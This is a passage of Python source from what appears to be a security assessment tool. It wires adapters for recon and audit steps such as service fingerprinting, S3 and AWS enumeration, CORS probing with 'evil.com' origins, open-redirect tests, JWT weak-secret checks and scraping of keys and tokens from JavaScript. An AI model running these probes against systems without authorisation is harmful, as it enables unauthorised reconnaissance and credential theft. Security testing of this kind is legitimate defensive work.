_TOOL_ADAPTERS["local_disco"]     = _adapter_local_disco
_TOOL_ADAPTERS["ids_check"]       = _adapter_ids
_TOOL_ADAPTERS["ids_snapshot"]    = _adapter_ids
_TOOL_ADAPTERS["tcpdump_sample"]  = _adapter_tcpdump_sample
# Port/HTTP variants reuse the existing typed adapters
_TOOL_ADAPTERS["port_scanner_external"] = _adapter_port_scanner
_TOOL_ADAPTERS["http_probe_auth"]       = _adapter_http_probe
_TOOL_ADAPTERS["http_probe_full"]       = _adapter_http_probe

# Local utility
_TOOL_ADAPTERS["hash_cracker"]    = _adapter_hash_cracker
_TOOL_ADAPTERS["processes"]       = _adapter_processes
_TOOL_ADAPTERS["users_audit"]     = _adapter_users_audit
_TOOL_ADAPTERS["posture"]         = _adapter_macos_posture_alias

# Wifi / utility aliases — point at the OSINT shodan_self alias when no
# dedicated wifi adapter; keeps the wifi playbook's first phase moving.
_TOOL_ADAPTERS["wifi_integrity"]  = _adapter_local_disco  # closest match: passive disco
_TOOL_ADAPTERS["bluetooth_recon"] = _adapter_local_disco
_TOOL_ADAPTERS["bt_recon"]        = _adapter_local_disco


# ── Batch 7 real adapters — final sweep ────────────────────────────────────
#
# Mix of (a) wrappers over routers I missed earlier, (b) internal HTTP
# analysis adapters that don't need a backend route, and (c) correlation
# / report adapters that operate purely on prior phase context.

async def _adapter_fingerprint(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import fingerprint as r
    # Targets come either as a single (host,port) tuple via options, or as
    # a feed-forward list of {port:..., service:...} from port_scanner.
    targets = options.get("targets")
    host = options.get("host") or target
    if isinstance(targets, list) and targets:
        # Extract ports from feed-forward port_scanner.open_ports
        ports: list[int] = []
        for t in targets:
            if isinstance(t, dict) and isinstance(t.get("port"), int):
                ports.append(t["port"])
            elif isinstance(t, int):
                ports.append(t)
        if ports:
            try:
                body = r.BulkRequest(host=str(host), ports=ports[:50], confirm=True)
                result = await r.fingerprint_bulk(body, _Req())
            except Exception as e:
                await emit({"type": "step_progress", "step": "fingerprint",
                            "msg": f"fingerprint: {type(e).__name__}"})
                return {"service_versions": [], "banners": [], "skipped": True}
            rows = result.get("results", []) or []
            return {
                "service_versions": [
                    {"host": host, "port": r0.get("port"),
                     "service": r0.get("service_guess"),
                     "version": r0.get("version")}
                    for r0 in rows
                ],
                "banners": [b for r0 in rows for b in (r0.get("banner_lines") or [])][:200],
            }
    # Single host/port path
    port = int(options.get("port") or 443)
    try:
        result = await r.fingerprint_one(str(host), port, _Req())
    except Exception as e:
        await emit({"type": "step_progress", "step": "fingerprint",
                    "msg": f"fingerprint: {type(e).__name__}"})
        return {"service_versions": [], "banners": [], "skipped": True}
    return {
        "service_versions": [{"host": host, "port": port,
                              "service": result.get("service_guess"),
                              "version": result.get("version")}],
        "banners": (result.get("banner_lines") or [])[:50],
    }


async def _adapter_s3_scan(target: str, options: dict[str, Any],
                           context: dict[str, Any], emit: EmitFn,
                           stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import s3_scanner as r
    init = {
        "target": target,
        "extra_keywords": list(options.get("extra_keywords") or []),
        "permutations": bool(options.get("permutations", True)),
        "confirm_auth": True,
    }
    public: list[str] = []
    listable: list[str] = []

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "hit":
            bucket = ev.get("bucket") or ev.get("name") or ""
            if ev.get("public"):  public.append(bucket)
            if ev.get("listable"): listable.append(bucket)
        elif t == "error":
            raise PresetError(f"s3_scan: {ev.get('detail','')}")

    try:
        await _drive_ws(r.s3_ws, init, emit, stop_event, on_event=on_event)
    except Exception as e:
        await emit({"type": "step_progress", "step": "s3_scan",
                    "msg": f"s3_scan: {type(e).__name__}"})
        return {"public_buckets": [], "listable_buckets": [],
                "bucket_count": 0, "skipped": True}
    return {
        "public_buckets": public[:200],
        "listable_buckets": listable[:200],
        "bucket_count": len(public) + len(listable),
        "public_s3_bucket": bool(public),
    }


async def _adapter_wifi_scan(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import wifi_scan as r
    try:
        result = await asyncio.to_thread(r.scan, _Req())
    except Exception as e:
        await emit({"type": "step_progress", "step": "wifi_scan",
                    "msg": f"wifi_scan: {type(e).__name__}"})
        return {"ssids": [], "bssids": [], "encryption": [],
                "signal_strength": [], "skipped": True}
    networks = result.get("networks", []) or []
    return {
        "ssids":  [n.get("ssid") for n in networks if isinstance(n, dict)][:200],
        "bssids": [n.get("bssid") for n in networks if isinstance(n, dict)][:200],
        "encryption": [n.get("encryption") for n in networks if isinstance(n, dict)][:200],
        "signal_strength": [n.get("signal_dbm") for n in networks if isinstance(n, dict)][:200],
        "gateway": "",
        "dns_servers": [],
        "evil_twin_detected": False,
    }


async def _adapter_jwt_check(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import jwt_analyzer as r
    token = options.get("token") or options.get("jwt") or ""
    if not token:
        # Look in prior phase outputs for an Authorization-style header
        token = ""
    if not token:
        await emit({"type": "step_progress", "step": "jwt_check",
                    "msg": "skipped: no `token` in options"})
        return {"algorithm": None, "weak_secret": None, "claims": {},
                "expiry": None, "none_algorithm": False, "skipped": True}
    try:
        result = await r.jwt_decode(r.JwtRequest(token=str(token), weak_secrets=True))
    except Exception as e:
        await emit({"type": "step_progress", "step": "jwt_check",
                    "msg": f"jwt: {type(e).__name__}"})
        return {"algorithm": None, "weak_secret": None, "claims": {},
                "skipped": True}
    return {
        "algorithm":     result.get("alg"),
        "weak_secret":   (result.get("weak_secret_match") or {}).get("secret"),
        "claims":        result.get("payload", {}),
        "expiry":        (result.get("claims_meta") or {}).get("exp_iso"),
        "none_algorithm": str(result.get("alg", "")).lower() == "none",
    }


async def _adapter_graphql(target: str, options: dict[str, Any],
                           context: dict[str, Any], emit: EmitFn,
                           stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import graphql as r
    url = options.get("url") or target
    if not str(url).startswith(("http://", "https://")):
        url = "https://" + str(url).lstrip("/")
    try:
        result = await r.graphql_introspect(
            url=str(url), confirm=True, request=_Req(),
        )
    except Exception as e:
        await emit({"type": "step_progress", "step": "graphql",
                    "msg": f"graphql: {type(e).__name__}"})
        return {"schema": None, "mutations": [], "queries": [],
                "introspection_enabled": False, "skipped": True}
    return {
        "schema": result.get("query_type"),
        "mutations": [m.get("field") for m in (result.get("mutations") or [])][:100],
        "queries":   [q.get("field") for q in (result.get("queries") or [])][:100],
        "introspection_enabled": bool(result.get("introspection_enabled", False)),
    }


# ── AWS per-service splits — all wrap aws_recon's single /recon endpoint ─

async def _aws_recon_service(service: str, target: str, emit: EmitFn) -> dict[str, Any]:
    from routers import aws_recon as r
    try:
        return await asyncio.to_thread(r.recon, _Req(), service)
    except Exception as e:
        await emit({"type": "step_progress", "step": f"aws_{service}",
                    "msg": f"aws_{service}: {type(e).__name__} "
                           f"(credentials configured?)"})
        return {}


async def _adapter_aws_iam(target, options, ctx, emit, stop):
    out = await _aws_recon_service("iam", target, emit)
    iam = out.get("iam") or {}
    users = iam.get("users") or []
    return {
        "users":      [u.get("UserName") for u in users][:200],
        "roles":      [r0.get("RoleName") for r0 in (iam.get("roles") or [])][:200],
        "policies":   [p.get("PolicyName") for p in (iam.get("policies") or [])][:200],
        "admin_users":[u.get("UserName") for u in users
                       if "admin" in str(u.get("UserName","")).lower()][:50],
        "mfa_disabled": [u.get("UserName") for u in users
                         if not u.get("MFAEnabled")][:50],
        "access_keys_age": [u.get("AccessKeyAge") for u in users
                            if u.get("AccessKeyAge")][:50],
    }


async def _adapter_aws_s3(target, options, ctx, emit, stop):
    out = await _aws_recon_service("s3", target, emit)
    s3 = out.get("s3") or {}
    buckets = s3.get("buckets") or []
    public = [b for b in buckets if b.get("public")]
    return {
        "buckets":              [b.get("name") for b in buckets][:200],
        "public_buckets":       [b.get("name") for b in public][:50],
        "acls":                 [b.get("acl") for b in buckets][:200],
        "encryption_disabled":  [b.get("name") for b in buckets
                                 if not b.get("encryption")][:50],
        "versioning_disabled":  [b.get("name") for b in buckets
                                 if not b.get("versioning")][:50],
        "public_s3_bucket":     bool(public),
    }


async def _adapter_aws_ec2(target, options, ctx, emit, stop):
    out = await _aws_recon_service("ec2", target, emit)
    ec2 = out.get("ec2") or {}
    insts = ec2.get("instances") or []
    sgs = ec2.get("security_groups") or []
    return {
        "instances":             [i.get("InstanceId") for i in insts][:200],
        "security_groups":       [g.get("GroupId") for g in sgs][:200],
        "public_instances":      [i.get("InstanceId") for i in insts
                                  if i.get("PublicIpAddress")][:50],
        "open_security_groups":  [g.get("GroupId") for g in sgs
                                  if any(rule.get("cidr") == "0.0.0.0/0"
                                         for rule in (g.get("rules") or []))][:50],
    }


async def _adapter_aws_lambda(target, options, ctx, emit, stop):
    out = await _aws_recon_service("lambda", target, emit)
    lam = out.get("lambda") or {}
    fns = lam.get("functions") or []
    return {
        "functions":        [f0.get("FunctionName") for f0 in fns][:200],
        "env_vars":         [f0.get("Environment") for f0 in fns][:50],
        "public_functions": [f0.get("FunctionName") for f0 in fns
                             if f0.get("Public")][:50],
    }


async def _adapter_aws_rds(target, options, ctx, emit, stop):
    out = await _aws_recon_service("rds", target, emit)
    rds = out.get("rds") or {}
    dbs = rds.get("dbs") or rds.get("instances") or []
    public = [d for d in dbs if d.get("PubliclyAccessible")]
    return {
        "databases":           [d.get("DBInstanceIdentifier") for d in dbs][:100],
        "public_rds":          [d.get("DBInstanceIdentifier") for d in public][:50],
        "encryption_disabled": [d.get("DBInstanceIdentifier") for d in dbs
                                if not d.get("StorageEncrypted")][:50],
        "backup_disabled":     [d.get("DBInstanceIdentifier") for d in dbs
                                if int(d.get("BackupRetentionPeriod") or 0) == 0][:50],
    }


async def _adapter_cloudtrail(target, options, ctx, emit, stop):
    # cloudtrail isn't broken out in aws_recon; use a `trails`/cloudtrail dict
    # if present, else surface a planned note.
    out = await _aws_recon_service("iam", target, emit)
    trails = out.get("cloudtrail") or out.get("trails") or {}
    return {
        "logging_enabled": bool(trails.get("enabled", False)),
        "log_validation":  bool(trails.get("log_validation", False)),
        "multi_region":    bool(trails.get("multi_region", False)),
        "planned":         not trails,
    }


# ── Internal HTTP analysis (no backend route required) ────────────────────

def _normalize_url(target: str, options: dict[str, Any]) -> str:
    url = options.get("url") or target
    if not str(url).startswith(("http://", "https://")):
        url = "https://" + str(url).lstrip("/")
    return str(url)


async def _adapter_security_headers(target: str, options: dict[str, Any],
                                    context: dict[str, Any], emit: EmitFn,
                                    stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    url = _normalize_url(target, options)
    try:
        async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as c:
            r = await c.get(url, headers={"User-Agent": "s-ide/0.3"})
    except Exception as e:
        await emit({"type": "step_progress", "step": "security_headers",
                    "msg": f"security_headers: {type(e).__name__}"})
        return {"missing_headers": [], "csp_policy": "", "xfo": "",
                "xcto": "", "referrer_policy": "", "skipped": True}
    h = {k.lower(): v for k, v in r.headers.items()}
    required = ["strict-transport-security", "content-security-policy",
                "x-frame-options", "x-content-type-options",
                "referrer-policy", "permissions-policy"]
    missing = [m for m in required if m not in h]
    return {
        "missing_headers": missing,
        "csp_policy":      h.get("content-security-policy", ""),
        "xfo":             h.get("x-frame-options", ""),
        "xcto":            h.get("x-content-type-options", ""),
        "referrer_policy": h.get("referrer-policy", ""),
        "hsts":            h.get("strict-transport-security", ""),
        "headers":         dict(h),
    }


async def _adapter_cookie_analysis(target: str, options: dict[str, Any],
                                   context: dict[str, Any], emit: EmitFn,
                                   stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    url = _normalize_url(target, options)
    try:
        async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as c:
            r = await c.get(url, headers={"User-Agent": "s-ide/0.3"})
    except Exception as e:
        await emit({"type": "step_progress", "step": "cookie_analysis",
                    "msg": f"cookies: {type(e).__name__}"})
        return {"missing_secure": [], "missing_httponly": [],
                "samesite_missing": [], "session_fixation": False,
                "skipped": True}
    cookies_raw = r.headers.get_list("set-cookie") if hasattr(r.headers, "get_list") else []
    if not cookies_raw:
        sc = r.headers.get("set-cookie", "")
        if sc: cookies_raw = [sc]
    missing_secure: list[str] = []
    missing_httponly: list[str] = []
    missing_samesite: list[str] = []
    for raw in cookies_raw:
        low = raw.lower()
        name = raw.split("=", 1)[0]
        if " secure" not in low and not low.endswith("secure"):
            missing_secure.append(name)
        if "httponly" not in low:
            missing_httponly.append(name)
        if "samesite" not in low:
            missing_samesite.append(name)
    return {
        "missing_secure":   missing_secure,
        "missing_httponly": missing_httponly,
        "samesite_missing": missing_samesite,
        "session_fixation": False,
        "cookies_seen":     len(cookies_raw),
    }


async def _adapter_cors(target: str, options: dict[str, Any],
                        context: dict[str, Any], emit: EmitFn,
                        stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    url = _normalize_url(target, options)
    origins_to_try = options.get("origins") or [
        "https://evil.com", "null", f"https://{target}.evil.com",
    ]
    misconfig = False
    allowed: list[str] = []
    creds_allowed = False
    try:
        async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as c:
            for origin in origins_to_try[:8]:
                try:
                    r = await c.get(url, headers={
                        "Origin": origin,
                        "User-Agent": "s-ide/0.3",
                    })
                except Exception:
                    continue
                acao = r.headers.get("access-control-allow-origin", "")
                if acao and (acao == "*" or acao == origin):
                    misconfig = True
                    allowed.append(origin)
                if r.headers.get("access-control-allow-credentials", "").lower() == "true":
                    creds_allowed = True
    except Exception as e:
        await emit({"type": "step_progress", "step": "cors",
                    "msg": f"cors: {type(e).__name__}"})
        return {"cors_misconfig": False, "origins_allowed": [],
                "credentials_allowed": False, "skipped": True}
    return {
        "cors_misconfig": misconfig,
        "origins_allowed": allowed,
        "credentials_allowed": creds_allowed,
    }


async def _adapter_open_redirect(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    base = _normalize_url(target, options)
    params = options.get("params") or ["redirect", "url", "next", "redir",
                                       "return", "returnUrl", "continue"]
    bait = "https://example.com/"
    redirects: list[dict[str, str]] = []
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as c:
            for p in params[:16]:
                test_url = base + ("&" if "?" in base else "?") + f"{p}={bait}"
                try:
                    r = await c.get(test_url, headers={
                        "User-Agent": "s-ide/0.3",
                    })
                except Exception:
                    continue
                loc = r.headers.get("location", "")
                if loc.startswith(bait) or loc == bait:
                    redirects.append({"param": p, "location": loc})
    except Exception:
        pass
    return {
        "open_redirects": [r["param"] for r in redirects],
        "redirect_params": redirects,
    }


async def _adapter_waf_detection(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    url = _normalize_url(target, options)
    vendor = ""
    waf_present = False
    try:
        async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as c:
            r = await c.get(url, headers={"User-Agent": "s-ide/0.3"})
    except Exception as e:
        await emit({"type": "step_progress", "step": "waf_detection",
                    "msg": f"waf: {type(e).__name__}"})
        return {"waf_present": False, "waf_vendor": "", "bypass_vectors": [],
                "skipped": True}
    headers_l = {k.lower(): v for k, v in r.headers.items()}
    server = headers_l.get("server", "").lower()
    signatures = {
        "cloudflare": ["cloudflare", "cf-ray", "__cf_bm"],
        "akamai":     ["akamai", "x-akamai"],
        "cloudfront": ["cloudfront"],
        "imperva":    ["incapsula", "x-iinfo"],
        "f5":         ["bigip", "f5-trace"],
        "aws-waf":    ["x-amzn-requestid", "x-amz-cf"],
        "fastly":     ["fastly"],
        "sucuri":     ["sucuri", "x-sucuri"],
    }
    blob = " ".join([server] + list(headers_l.keys()) + list(headers_l.values()))
    for v, sigs in signatures.items():
        if any(s in blob.lower() for s in sigs):
            vendor = v; waf_present = True
            break
    return {
        "waf_present": waf_present,
        "waf_vendor": vendor,
        "bypass_vectors": [],
        "cdn_detected": "cloudfront" in vendor or "akamai" in vendor or "fastly" in vendor,
    }


# ── Internal OSINT / correlate / report ────────────────────────────────────

def _domain_variants(domain: str) -> list[str]:
    """Generate cheap typosquat variants (homoglyph + char swap)."""
    base = domain.split(".")[0]
    tld = domain[len(base):]
    out: set[str] = set()
    # Char drop
    for i in range(len(base)):
        out.add(base[:i] + base[i+1:] + tld)
    # Adjacent swap
    for i in range(len(base) - 1):
        out.add(base[:i] + base[i+1] + base[i] + base[i+2:] + tld)
    # Common homoglyph subs
    for a, b in [("o", "0"), ("i", "1"), ("l", "1"), ("e", "3")]:
        if a in base:
            out.add(base.replace(a, b, 1) + tld)
    # Hyphen insert
    if len(base) > 4:
        mid = len(base) // 2
        out.add(base[:mid] + "-" + base[mid:] + tld)
    return [d for d in out if d != domain][:30]


async def _adapter_typosquat(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    import socket
    variants = _domain_variants(target)
    registered: list[str] = []
    for v in variants:
        try:
            socket.gethostbyname(v)
            registered.append(v)
        except Exception:
            pass
    return {
        "typosquat_domains":      variants,
        "registered_lookalikes":  registered,
        "parked_domains":         registered,  # naive — would need WHOIS to refine
    }


async def _adapter_mx_trace(target: str, options: dict[str, Any],
                            context: dict[str, Any], emit: EmitFn,
                            stop_event: asyncio.Event) -> dict[str, Any]:
    # Use dns_recon to get MX records, then classify by provider hint.
    summary = await _adapter_dns_recon(target, options, context, emit, stop_event)
    mx = summary.get("mx") or []
    blob = " ".join(str(m).lower() for m in mx)
    provider = "unknown"
    if "google" in blob or "googlemail" in blob: provider = "google"
    elif "outlook" in blob or "office365" in blob or "protection.outlook" in blob: provider = "microsoft"
    elif "mimecast" in blob: provider = "mimecast"
    elif "proofpoint" in blob: provider = "proofpoint"
    elif "barracuda" in blob: provider = "barracuda"
    elif "amazonses" in blob: provider = "amazon-ses"
    elif "zoho" in blob: provider = "zoho"
    return {
        "mail_provider": provider,
        "security_gateway": provider if provider in ("mimecast", "proofpoint", "barracuda") else "",
        "filtering_vendor": provider,
        "mx": mx,
    }


async def _adapter_webmail_discovery(target: str, options: dict[str, Any],
                                     context: dict[str, Any], emit: EmitFn,
                                     stop_event: asyncio.Event) -> dict[str, Any]:
    # Probe a small set of webmail paths and check whether any 200.
    import httpx
    base = _normalize_url(target, options)
    paths = options.get("paths") or [
        "/owa/", "/exchange/", "/ews/Exchange.asmx", "/webmail/",
        "/mail/", "/roundcube/", "/squirrelmail/",
        "/iredmail/", "/horde/", "/zimbra/",
    ]
    found: list[dict[str, Any]] = []
    portal_type = ""
    try:
        async with httpx.AsyncClient(timeout=8.0, follow_redirects=True) as c:
            for p in paths[:16]:
                try:
                    r = await c.get(base.rstrip("/") + p,
                                    headers={"User-Agent": "s-ide/0.3"})
                except Exception:
                    continue
                if 200 <= r.status_code < 300:
                    found.append({"path": p, "status": r.status_code})
                    if "owa" in p: portal_type = "owa"
                    elif "roundcube" in p: portal_type = "roundcube"
                    elif "webmail" in p: portal_type = portal_type or "generic-webmail"
    except Exception:
        pass
    return {
        "webmail_url": (found[0]["path"] if found else ""),
        "portal_type": portal_type,
        "mfa_required": False,  # would need login-flow inspection
        "found": found,
    }


async def _adapter_js_analysis(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    import httpx
    js_urls = options.get("targets") or options.get("js_files") or []
    if isinstance(js_urls, str): js_urls = [js_urls]
    if not js_urls:
        return {"endpoints": [], "secrets": [], "api_keys": [],
                "comments": [], "skipped": True}
    endpoints: set[str] = set()
    secrets: list[str] = []
    api_keys: list[str] = []
    comments: list[str] = []
    endpoint_re = re.compile(r'["\'`](?:/[a-zA-Z0-9_./-]{2,80})["\'`]')
    aws_key_re = re.compile(r'AKIA[A-Z0-9]{16}')
    bearer_re = re.compile(r'Bearer\s+[A-Za-z0-9._-]{20,}')
    comment_re = re.compile(r'/\*.{1,200}?\*/|//.{1,200}')
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as c:
            for u in js_urls[:20]:
                try:
                    r = await c.get(str(u),
                                    headers={"User-Agent": "s-ide/0.3"})
                    body = r.text[:200_000]
                except Exception:
                    continue
                for m in endpoint_re.findall(body)[:50]:
                    endpoints.add(m.strip('"\'`'))
                api_keys.extend(aws_key_re.findall(body)[:5])
                secrets.extend(bearer_re.findall(body)[:5])
                comments.extend(comment_re.findall(body)[:5])
    except Exception as e:
        await emit({"type": "step_progress", "step": "js_analysis",
                    "msg": f"js_analysis: {type(e).__name__}"})
    return {
        "endpoints": sorted(endpoints)[:200],
        "secrets":   secrets[:25],
        "api_keys":  api_keys[:25],
        "comments":  comments[:25],
    }


async def _adapter_ioc_correlate(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    # `context` is the snapshot of all prior phases (dict of dicts).
    iocs: list[str] = []
    risk_score = 0
    for phase_name, phase_data in (context or {}).items():
        if not isinstance(phase_data, dict): continue
        for step_id, step_summary in phase_data.items():
            if not isinstance(step_summary, dict): continue
            # Walk through known-risky output keys
            for key in ("cves", "vulnerabilities", "iocs_found",
                        "c2_indicators", "suspicious_processes",
                        "suspicious_connections", "breached_accounts"):
                v = step_summary.get(key)
                if isinstance(v, list) and v:
                    iocs.extend(f"{phase_name}.{step_id}.{key}={x}"
                                for x in v[:10])
                    risk_score += min(len(v), 10) * 2
                elif isinstance(v, int) and v > 0:
                    iocs.append(f"{phase_name}.{step_id}.{key}={v}")
                    risk_score += min(v, 10)
            for key in ("eternalblue", "ms17_010",
                        "null_session_allowed", "axfr_succeeded",
                        "subdomain_takeover", "imds_exposed",
                        "default_creds"):
                if step_summary.get(key):
                    iocs.append(f"{phase_name}.{step_id}.{key}")
                    risk_score += 15
    return {
        "iocs_found": iocs[:200],
        "risk_score": risk_score,
        "incident_response_needed": risk_score >= 30,
    }


async def _adapter_generate_report(target: str, options: dict[str, Any],
                                   context: dict[str, Any], emit: EmitFn,
                                   stop_event: asyncio.Event) -> dict[str, Any]:
    template = options.get("template") or "generic"
    phases_seen: list[str] = []
    findings_count = 0
    important: list[str] = []
    for phase_name, phase_data in (context or {}).items():
        phases_seen.append(phase_name)
        if not isinstance(phase_data, dict): continue
        for step_id, step_summary in phase_data.items():
            if not isinstance(step_summary, dict): continue
            for key in ("cves", "vulnerabilities", "public_buckets",
                        "vulnerable_subdomains", "open_redirects",
                        "injectable_params", "breached_accounts"):
                v = step_summary.get(key)
                if isinstance(v, list) and v:
                    findings_count += len(v)
                    for item in v[:3]:
                        important.append(f"{step_id}.{key}: {item}")
                elif isinstance(v, int) and v > 0:
                    findings_count += v
                    important.append(f"{step_id}.{key}: {v}")
    await emit({"type": "step_progress", "step": "generate_report",
                "msg": f"report ({template}): {len(phases_seen)} phases, "
                       f"{findings_count} aggregated findings"})
    return {
        "report_template": template,
        "phases_summarized": phases_seen,
        "findings_total": findings_count,
        "important_findings": important[:50],
        "output": "in-memory; export via the Reports page",
    }


# ── AWS analysis adapters (operate on prior phase aws_* outputs) ──────────

async def _adapter_sg_analysis(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    sgs = options.get("targets") or []
    if isinstance(sgs, str): sgs = [sgs]
    any_any = [s for s in sgs if isinstance(s, dict)
               and any((rule.get("cidr") == "0.0.0.0/0" and
                        rule.get("port") in (None, 0, "all"))
                       for rule in (s.get("rules") or []))]
    wide = [s for s in sgs if isinstance(s, dict)
            and any(rule.get("cidr") == "0.0.0.0/0"
                    for rule in (s.get("rules") or []))]
    return {
        "any_any_rules":  [s.get("GroupId") if isinstance(s, dict) else str(s)
                           for s in any_any][:50],
        "wide_open_ports": [s.get("GroupId") if isinstance(s, dict) else str(s)
                            for s in wide][:50],
        "ssh_exposed": [s.get("GroupId") for s in wide
                        if isinstance(s, dict) and
                        any(rule.get("port") == 22 for rule in (s.get("rules") or []))][:25],
        "rdp_exposed": [s.get("GroupId") for s in wide
                        if isinstance(s, dict) and
                        any(rule.get("port") == 3389 for rule in (s.get("rules") or []))][:25],
    }


async def _adapter_iam_analysis(target: str, options: dict[str, Any],
                                context: dict[str, Any], emit: EmitFn,
                                stop_event: asyncio.Event) -> dict[str, Any]:
    policies = options.get("targets") or []
    if isinstance(policies, str): policies = [policies]
    admin_wildcards = [p for p in policies if isinstance(p, dict)
                       and "*" in str(p.get("Action") or p.get("policy") or "")]
    return {
        "admin_wildcards": [p.get("PolicyName") if isinstance(p, dict) else str(p)
                            for p in admin_wildcards][:50],
        "privilege_escalation_paths": [],
        "unused_permissions": [],
    }


async def _adapter_s3_analysis(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    buckets = options.get("targets") or []
    if isinstance(buckets, str): buckets = [buckets]
    return {
        "public_read": [b.get("name") for b in buckets
                        if isinstance(b, dict) and b.get("public_read")][:50],
        "public_write": [b.get("name") for b in buckets
                         if isinstance(b, dict) and b.get("public_write")][:50],
        "no_encryption": [b.get("name") for b in buckets
                          if isinstance(b, dict) and not b.get("encryption")][:50],
        "no_versioning": [b.get("name") for b in buckets
                          if isinstance(b, dict) and not b.get("versioning")][:50],
    }


# ── Misc placeholders → light real adapters ────────────────────────────────

async def _adapter_default_creds(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    # Surface a structured "planned" result so the playbook keeps moving.
    # Real default-cred check needs per-protocol code we haven't written.
    ports = options.get("targets") or []
    if isinstance(ports, list):
        await emit({"type": "step_progress", "step": "default_creds",
                    "msg": f"received {len(ports)} services; default-creds "
                           f"checking is a future router"})
    return {"default_creds_found": [], "services": [], "planned": True}


async def _adapter_imds_v2_check(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    await emit({"type": "step_progress", "step": "imds_v2_check",
                "msg": "imdsv2 enforcement check needs the ssrf adapter "
                       "context — wire through phase_N.ssrf_imds"})
    return {"imdsv2_enforced": None, "token_required": None, "planned": True}


async def _adapter_searchsploit(target: str, options: dict[str, Any],
                                context: dict[str, Any], emit: EmitFn,
                                stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import exploits as r
    # Use the search-from-scan endpoint if options has rows; else free-text search.
    rows = options.get("targets") or []
    if isinstance(rows, list) and rows and isinstance(rows[0], dict):
        try:
            scan_rows = []
            for r0 in rows[:50]:
                scan_rows.append(r.ScanRow(
                    service=str(r0.get("service") or ""),
                    version=str(r0.get("version") or ""),
                ))
            result = await r.search_from_scan(r.ScanEnrichBody(rows=scan_rows))
        except Exception as e:
            await emit({"type": "step_progress", "step": "searchsploit",
                        "msg": f"searchsploit: {type(e).__name__}"})
            return {"matching_exploits": [], "exploit_count": 0,
                    "skipped": True}
        hits = result.get("results", []) or result.get("matches", []) or []
        return {
            "matching_exploits": [h.get("title") or h.get("file") for h in hits][:100],
            "exploit_count": len(hits),
        }
    q = str(options.get("q") or target)
    try:
        result = await r.search(q=q)
    except Exception as e:
        await emit({"type": "step_progress", "step": "searchsploit",
                    "msg": f"searchsploit: {type(e).__name__}"})
        return {"matching_exploits": [], "exploit_count": 0, "skipped": True}
    hits = result.get("results", []) or []
    return {
        "matching_exploits": [h.get("title") for h in hits if isinstance(h, dict)][:100],
        "exploit_count": len(hits),
    }


async def _adapter_cve_lookup(target: str, options: dict[str, Any],
                              context: dict[str, Any], emit: EmitFn,
                              stop_event: asyncio.Event) -> dict[str, Any]:
    # Delegate to searchsploit, then synthesize CVE list from titles.
    summary = await _adapter_searchsploit(target, options, context, emit, stop_event)
    titles = summary.get("matching_exploits") or []
    cve_re = re.compile(r"CVE-\d{4}-\d{4,7}")
    cves: set[str] = set()
    for t in titles:
        cves.update(cve_re.findall(str(t)))
    severities = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    return {
        "cves": sorted(cves),
        "severity_breakdown": severities,  # NVD lookup would fill this; future
    }


async def _adapter_permutation(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    """Subdomain permutation generator. Given a list of base subdomains,
    emit common dev/staging/admin permutations."""
    bases = options.get("targets") or [target]
    if isinstance(bases, str): bases = [bases]
    prefixes = ["dev-", "staging-", "test-", "admin-", "internal-",
                "vpn-", "qa-", "preview-", "demo-"]
    out: set[str] = set()
    for b in bases[:50]:
        b = str(b)
        for px in prefixes:
            out.add(px + b)
            if "." in b:
                first, rest = b.split(".", 1)
                out.add(f"{px}{first}.{rest}")
    return {
        "permutation_hits": [],  # would need DNS lookup per variant
        "permutations": sorted(out)[:300],
    }


# ── Wire up overrides ──────────────────────────────────────────────────────

_TOOL_ADAPTERS["fingerprint"]       = _adapter_fingerprint
_TOOL_ADAPTERS["s3_scan"]           = _adapter_s3_scan
_TOOL_ADAPTERS["wifi_scan"]         = _adapter_wifi_scan
_TOOL_ADAPTERS["jwt_check"]         = _adapter_jwt_check
_TOOL_ADAPTERS["graphql"]           = _adapter_graphql

_TOOL_ADAPTERS["aws_iam"]           = _adapter_aws_iam
_TOOL_ADAPTERS["aws_s3"]            = _adapter_aws_s3
_TOOL_ADAPTERS["aws_ec2"]           = _adapter_aws_ec2
_TOOL_ADAPTERS["aws_lambda"]        = _adapter_aws_lambda
